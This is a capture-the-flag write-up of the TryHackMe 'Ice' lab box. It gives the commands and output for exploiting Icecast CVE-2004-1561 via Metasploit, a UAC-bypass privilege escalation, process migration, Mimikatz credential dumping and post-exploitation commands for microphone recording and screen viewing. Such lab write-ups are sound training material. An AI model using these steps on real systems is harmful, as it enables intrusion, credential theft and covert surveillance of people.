This write-up is focused on penetration testing. I performed this Box called Ice from 
TryHackMe with basic googling of priv esc and using a previously known vulnerability used in the Icecast Media server 
known as CVE-2004-1561. This allows remote code execution through the Media Server. This vulnerability no longer exists 
with today's computers as this was discoved in 2004. This is strickly educational. Enjoy!


# Ice (TryHackMe Write-Up)

## Stage 1: Recon 

The given IP is 10.10.67.129

```
export IP=10.10.67.129
```
I use this command for ease of efficiency. This caches the IP address in the specific terminal so I do not have to repeatedly 
type the IP. I instead type $IP when I need to use the IP.

The first thing I like to do is perform an nmap scan of all the open ports. Since this machine is extremely vulnerable, a 
bunch of ports are open. I ran the following scan command:

```
nmap -sV -sC -oA nmap_initial 10.10.67.129
```

Output below.

```
Nmap scan report for 10.10.67.129
Host is up (0.11s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server

49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

1. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, 
the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. 
One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

```
3389/tcp  open  ssl/ms-wbt-server?
```

2. What service did nmap identify as running on port 8000? (First word of this service)

```
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
```

3. What service did nmap identify as running on port 8000? (First word of this service)

```
Icecast
```

4. What does Nmap identify as the hostname of the machine? (All caps for the answer)

```
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Stage 2: Gain Access

1. Now that we've identified some interesting services running on our target machine, let's do a little bit of research 
into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is 
heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of 
vulnerability is it? Use https://www.cvedetails.com for this question and the next.

```
Answer: Execute Code Overflow
```

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

```
CVE-2004-1561
```

3. Search for the vulnerability in Metasploit. What is the file path to the exploit?

```
exploit/windows/http/icecast_header
```

4. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. 
What is the only required setting which currently is blank?

```
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
```

5. Set RHOSTS to target IP and exploit.

```
msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.67.129
RHOSTS => 10.10.67.129
msf5 exploit(windows/http/icecast_header) > exploit

```

6.  Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

```
meterpreter
```

7.  What user was running that Icecast process?

```
meterpreter > getuid
Server username: Dark-PC\Dark
```

8. What build of Windows is the system?

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

```

9. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. 
First, what is the architecture of the process we're running?

```
x64
```

10.  	

Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full 
path (starting with exploit/) for the first returned exploit?

```
exploit/windows/local/bypassuac_eventvwr
```

11. Background the meterpreter session and use the new exploit for priv esc.

```
msf5 exploit(windows/local/bypassuac_eventvwr) > set SESSION 2
SESSION => 2
msf5 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.9.74.9
LHOST => 10.9.74.9
msf5 exploit(windows/local/bypassuac_eventvwr) > exploit

```

12. Very extended privileges.

```
meterpreter > getprivs

``` 

13. What privilege allows us to take ownership of files?

```
SeTakeOwnershipPrivilege
```

## Stage 3: Looting

1. Lets take a look at the processes to see if our shell is has escalated. We do this with 'ps'

```
  C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 904   816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1040  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1136  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1260  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1308  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1316  2268  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 1400  692   taskhost.exe          x64   1        Dark-PC\Dark                

```

2. We need to interact with the lsass service and since it is running as NT AUTHORITY\SYSTEM, we will migrate to 
another service with the same privilege. 

We see the printer service "spoolsv.exe" and we will migrate into this process.

```
migrate 1260 <- This is the Process ID or PID associated with spoolsv.exe
```
```
meterpreter > migrate 1260
[*] Migrating from 2356 to 1260...
[*] Migration completed successfully.
meterpreter > 
```

We are now NT AUTHORITY\SYSTEM!

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

3. Now, we will load Mimikatz (very useful password dumping tool)

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > 
```

4. Gather all credentials.

```
We will use creds_all to grab all credentials
```

Here they are!

```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----

(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

```
## Stage 4: Post Exploitation

Since I are now in the system with full access, I can do some cool things! For example if this machine was a Kerberos 
Domain Controller we could create a golden ticket to increase our authentication persistence. All we need to do is the 
following command:

```
golden_ticket_create
```

We can listen to the mic attached to the computer with...

```
record_mic
```

We can view the desktop with

```
screenshare
```

1. What I will do for fun is connect to the system via RDP now that I know Dark's password.

This was the Icecast box write-up! I know this is a low-level exploit but it was fun to do and fun to explain what 
is happening!

Hope you enjoyed! Will be posting more write-ups through either TryHackMe or HackTheBox in the future.
